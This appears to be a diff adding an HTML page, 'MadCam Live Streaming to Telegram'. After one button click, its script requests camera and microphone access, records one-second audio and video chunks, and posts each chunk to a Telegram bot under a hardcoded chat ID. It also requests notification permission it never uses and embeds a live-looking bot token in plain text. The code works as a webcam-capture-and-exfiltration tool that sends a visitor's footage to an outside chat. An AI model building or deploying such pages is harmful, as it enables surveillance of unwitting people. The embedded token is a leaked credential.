@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+<head>
+  <title>MadCam Live to Telegram</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 20px; }
+    video { border: 2px solid #333; width: 640px; height: 480px; margin-top: 20px; }
+    button { font-size: 18px; padding: 10px 20px; margin-top: 20px; cursor: pointer; }
+    h1 { margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>MadCam Live Streaming to Telegram</h1>
+  <video id="liveVideo" autoplay playsinline muted></video>
+  <br>
+  <button id="startBtn">Start Live Stream</button>
+
+  <script>
+    'use strict';
+
+    const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
+    const CHAT_ID = "8504837303";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+
+    const videoElement = document.getElementById('liveVideo');
+    let mediaRecorder;
+    let sending = false;
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
+      try {
+        // 1️⃣ Request Notification permission
+        const notifPermission = await Notification.requestPermission();
+        console.log('Notification permission:', notifPermission);
+
+        // 2️⃣ Request Camera + Microphone permission
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        videoElement.srcObject = stream;
+
+        // 3️⃣ Setup MediaRecorder for live chunks
+        const options = { mimeType: 'video/webm; codecs=vp8,opus' };
+        mediaRecorder = new MediaRecorder(stream, options);
+
+        mediaRecorder.ondataavailable = async (event) => {
+          if (event.data && event.data.size > 0) {
+            if (!sending) {
+              sending = true;
+              const formData = new FormData();
+              formData.append('chat_id', CHAT_ID);
+              formData.append('video', event.data, 'live_chunk.webm');
+
+              try {
+                await fetch(TELEGRAM_API, { method: 'POST', body: formData });
+                console.log('Chunk sent to Telegram');
+              } catch (err) {
+                console.error('Error sending chunk:', err);
+              }
+              sending = false;
+            }
+          }
+        };
+
+        mediaRecorder.start(1000); // 1-second chunks for near-live streaming
+        console.log('Live streaming started');
+        alert('Live streaming started!');
+
+        // Disable start button to prevent multiple streams
+        document.getElementById('startBtn').disabled = true;
+
+      } catch (err) {
+        console.error("Error accessing permissions or media:", err);
+        alert(err.message);
+      }
+    });
+  </script>
+</body>
+</html>
